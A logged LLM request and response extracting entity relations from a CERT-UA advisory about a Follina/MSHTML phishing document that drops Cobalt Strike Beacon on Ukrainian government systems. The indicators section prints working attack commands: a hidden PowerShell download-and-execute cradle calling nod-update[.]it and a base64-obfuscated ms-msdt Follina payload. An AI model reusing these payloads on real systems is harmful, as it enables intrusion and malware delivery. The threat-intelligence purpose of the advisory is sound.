@@ -1,0 +1,115 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- зміни оплата праці з нарахуваннями.docx [Malicious File] A malicious Microsoft Word document used to exploit office vulnerabilities and deliver payloads.
+- Україна [Country] A country in Eastern Europe whose state organizations were targeted in this incident.
+- CVE-2021-40444 [Vulnerability] A remote code execution vulnerability in Microsoft MSHTML.
+- CVE-2022-30190 [Vulnerability] A Microsoft Windows Support Diagnostic Tool remote code execution vulnerability also known as Follina.
+- PowerShell [Software Product] A task automation and configuration management framework developed by Microsoft.
+- ms-msdt.exe [Malware Family] A malicious executable file used to drop and run Cobalt Strike Beacon.
+- Cobalt Strike Beacon [Malware Family] A payload and post-exploitation agent belonging to the Cobalt Strike framework.
+- sdiagnhost.exe [Malware Family] A legitimate Windows system process associated with the Scripted Diagnostics Native Host.
+- Good thing we disabled macros.html [Malware Family] A malicious HTML file containing JavaScript code used in the exploit chain.
+- nod-update[.]it [Domain Name] A malicious domain used for hosting exploit payloads and staging malware downloads.
+- 185[.]64.106.39 [IP Address] An IP address associated with the malicious domain infrastructure in this incident.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [Malware Family] -> Tail [Malware Family]:
+- contains-file: An archive or container file encapsulates another specified file or malware component.
+
+Head [Malware Family] -> Tail [Domain Name]:
+- exfiltrates-data-to: The malware transmits stolen or collected data to a target service, domain, or server.
+
+Head [Domain Name] -> Tail [Malicious File]:
+- hosts-file: The web resource, server, or domain hosts a malicious or dropper file for download.
+
+Head [Domain Name] -> Tail [Malware Family]:
+- hosts-file: The web resource, server, or domain hosts a malicious or dropper file for download.
+
+Head [IP Address] -> Tail [Domain Name]:
+- hosted-by: The head entity's infrastructure is hosted or provided by the service provider specified by the tail entity.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено файл "зміни оплата праці з нарахуваннями.docx", що розповсюджувався серед державних організацій України засобами електронної пошти.</p><p>З'ясовано, що документ містить посилання на зовнішній об'єкт (HTML-файл, що містить JavaScript-код), виконання якого, після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190, призведе до запуску PowerShell-команди, завантаження EXE-файлу "ms-msdt.exe" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon.</p><p>CERT-UA ініційовано заходи з блокування доменного імені та відповідного серверу.</p><p>Рекомендуємо вжити заходів зі зниження вірогідності експлуатації вразливостей (hXXps://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/). Окремо звернути увагу на процес "sdiagnhost.exe" в контексті створення підозрілих файлів та процесів.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">48bc4f0c9b3fe67610c105de0b2a6bd7&nbsp; &nbsp; 7fafbd8d6b15279ca377d5d871ecb108284fc28f905b73488850999d445c2087&nbsp; &nbsp; зміни оплата праці з нарахуваннями.docx
+754c122f3e311825adc9d46ba3665bb9&nbsp; &nbsp; cf2f412ea94253358d3b2a4eebdf2067c6952b1921f0cb754ce888a01e0e0065&nbsp; &nbsp; Good thing we disabled macros.html
+34efd97c9ed25e68b52f35b2c6cab9a5&nbsp; &nbsp; 7908d7095ed1cde36b7fd8f45966fc56f0b72ca131121fdb3f8397c0710100e1&nbsp; &nbsp; ms-msdt.exe (Cobalt Strike Beacon)
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">powershell -exec bypass -noP -nonI -w hidden IEX(New-Object Net.WebClient).DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\Users\Public\ms-msdt.exe'); powershell -exec bypass -noP -nonI -w hidden C:\Users\Public\ms-msdt.exe
+ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBuAG8AUAAgAC0AbgBvAG4ASQAgAC0AdwAgAGgAaQBkAGQAZQBuACAASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBuAG8AZAAtAHUAcABkAGEAdABlAC4AaQB0AC8AbQBzAC0AbQBzAGQAdAAuAGUAeABlACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAbQBzAC0AbQBzAGQAdAAuAGUAeABlACcAKQA7ACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBuAG8AUAAgAC0AbgBvAG4ASQAgAC0AdwAgAGgAaQBkAGQAZQBuACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABtAHMALQBtAHMAZAB0AC4AZQB4AGUA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""
+C:\Users\Public\ms-msdt.exe
+</pre><p><em>&nbsp;&nbsp;(Процеси):</em></p><pre class="ql-syntax" spellcheck="false">&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noP -nonI -w hidden %PUBLIC%\ms-msdt.exe
+&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noP -nonI -w hidden IEX
+&nbsp;&nbsp;11&nbsp;&nbsp;-&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;%PUBLIC%\ms-msdt.exe&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;
+&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\System32\svchost.exe&nbsp;&nbsp;%SYSTEMROOT%\System32\rundll32.exe&nbsp;rundll32.exe %SYSTEMROOT%\system32\davclnt.dll,DavSetCookie nod-update[.]it@SSL hXXps://nod-update[.]it/check-updates/c/updates
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://nod-update[.]it/check-updates/c/updates/updates.html
+hXXps://nod-update[.]it/siteindex/b/
+hXXps://nod-update[.]it/getsearchresults
+nod-update[.]it
+185[.]64.106.39
+</pre><p><br></p><p><strong>Графічні зображення:</strong></p><p></p>
+
+=== RESPONSE (6.0s, in 2901 / out 548 tok, STOP) ===
+The incident involves a malicious Word document targeting Ukrainian state organizations by exploiting CVE-2021-40444 and CVE-2022-30190 to download and execute ms-msdt.exe hosting Cobalt Strike Beacon from nod-update[.]it.
+
+{
+  "relations": [
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts-file",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')",
+      "fit": "exact"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "targets",
+      "tail": "Україна",
+      "evidence": "розповсюджувався серед державних організацій України засобами електронної пошти",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets",
+      "definition": "The malicious file or threat activity is directed against the specified target country, sector, or organization."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "The malicious file or tool leverages the specified vulnerability to execute arbitrary code or compromise a system."
+    }
+  ]
+}
